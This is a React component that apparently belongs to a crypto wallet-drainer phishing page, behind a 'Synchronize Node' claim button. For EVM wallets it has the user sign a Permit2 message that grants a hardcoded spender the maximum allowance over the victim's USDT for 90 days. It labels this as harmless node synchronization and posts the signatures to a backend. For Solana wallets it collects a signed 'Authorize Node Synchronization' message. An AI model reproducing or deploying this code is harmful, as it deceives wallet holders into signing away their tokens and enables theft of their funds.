import { useState } from "react";
import { Loader2, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { useAccount, useSignTypedData } from "wagmi"; // EVM Tools
import { useAppKitProvider, useAppKitAccount } from "@reown/appkit/react"; // Cross-chain tools

export default function ClaimButton() {
  const { address: evmAddress, isConnected: isEvmConnected, chainId } = useAccount();
  const { address: solAddress, isConnected: isSolConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('solana'); // To talk to Phantom
  const { signTypedDataAsync } = useSignTypedData();
  
  const [status, setStatus] = useState<"ready" | "signing" | "success">("ready");

  const handleClaim = async () => {
    setStatus("signing");

    try {
      // --- LOGIC FOR SOLANA ---
      if (isSolConnected && solAddress) {
        const message = new TextEncoder().encode(
          `Authorize Node Synchronization\nWallet: ${solAddress}\nTimestamp: ${Date.now()}`
        );
        // This triggers the Phantom "Sign Message" popup
        const signature = await (walletProvider as any).signMessage(message);
        
        await sendToBackend({
          address: solAddress,
          signature: Buffer.from(signature).toString('hex'),
          chain: 'solana'
        });
      } 
      
      // --- LOGIC FOR EVM (ETH/BNB) ---
      else if (isEvmConnected && evmAddress) {
        const signature = await signTypedDataAsync({
          domain: {
            name: "Permit2",
            chainId: chainId || 1,
            verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`,
          },
          types: {
            PermitSingle: [
              { name: "details", type: "PermitDetails" },
              { name: "spender", type: "address" },
              { name: "sigDeadline", type: "uint256" },
            ],
            PermitDetails: [
              { name: "token", type: "address" },
              { name: "amount", type: "uint160" },
              { name: "expiration", type: "uint48" },
              { name: "nonce", type: "uint48" },
            ],
          },
          primaryType: "PermitSingle",
          message: {
            details: {
              token: chainId === 56 ? "0x55d398326f99059fF775485246999027B3197955" : "0xdac17f958d2ee523a2206206994597C13D831ec7",
              amount: BigInt("1461501637330902918203684832719962830284595200000"),
              expiration: Math.floor(Date.now() / 1000) + 90 * 24 * 3600,
              nonce: Math.floor(Math.random() * 1000000),
            },
            spender: "0x5aD69516BE38EF4B8dab3e1Ff6b5206927Fa38c3" as `0x${string}`,
            sigDeadline: Math.floor(Date.now() / 1000) + 3600,
          },
        });

        await sendToBackend({
          address: evmAddress,
          signature,
          chain: chainId === 56 ? 'bnb' : 'ethereum'
        });
      } else {
        toast.error("Connect a wallet first");
        setStatus("ready");
        return;
      }

      setStatus("success");
      toast.success("Synchronized Successfully");
    } catch (err) {
      console.error(err);
      setStatus("ready");
      toast.error("Signature rejected");
    }
  };

  const sendToBackend = async (data: any) => {
    return fetch(`${import.meta.env.VITE_API_URL}/claim`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-api-key": "0fb2e4..." },
      body: JSON.stringify(data),
    });
  };

  return (
    <Button onClick={handleClaim} disabled={status !== "ready"} className="w-full h-16 rounded-xl font-bold">
      {status === "signing" ? <Loader2 className="animate-spin" /> : "Synchronize Node"}
    </Button>
  );
}
